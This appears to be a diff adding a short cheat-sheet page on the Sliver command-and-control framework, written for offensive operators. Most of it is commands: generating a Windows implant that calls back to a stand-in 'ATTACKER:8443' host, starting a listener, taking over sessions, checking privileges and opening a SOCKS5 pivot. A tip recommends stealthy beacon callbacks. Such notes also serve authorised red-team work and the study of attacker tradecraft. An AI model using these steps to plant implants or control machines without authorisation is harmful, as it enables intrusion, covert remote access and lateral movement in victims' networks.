@@ -1,0 +1,22 @@
+---
+title: "Sliver"
+---
+
+Open-source C2 — a modern, scriptable alternative to Metasploit/Cobalt Strike for implants, pivoting, and post-ex.
+
+```bash
+# server
+sliver-server
+# generate an implant
+sliver > generate --mtls ATTACKER:8443 --os windows --arch amd64 --save ./imp.exe
+sliver > mtls -l 8443            # start the listener
+# after execution on target
+sliver > sessions
+sliver > use <id>
+sliver (SESSION) > whoami ; ls ; getprivs
+sliver (SESSION) > socks5 start       # pivot; or: pivots / portfwd
+```
+
+<Tip>
+Use beacons (`generate beacon`) for stealthy, low-and-slow callbacks and interactive sessions when you need hands-on control.
+</Tip>
